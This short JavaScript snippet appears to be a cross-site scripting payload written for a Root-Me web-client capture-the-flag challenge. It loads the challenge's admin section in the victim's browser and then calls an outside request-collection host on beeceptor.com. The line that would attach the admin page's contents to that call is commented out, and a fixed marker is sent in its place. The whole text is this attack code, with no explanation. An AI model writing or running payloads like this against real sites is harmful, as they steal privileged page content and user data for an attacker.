var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://challenge01.root-me.org/web-client/ch19/?section=admin", true);

xhr.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
      var xhr2 = new XMLHttpRequest();
      xhr2.open("GET", "https://forum.free.beeceptor.com/?cc=AKAY", true);
                //+encodeURI(this.responseText), true);
      xhr2.send(null);
  }
  
};

xhr.send(null);
console.log('m2')
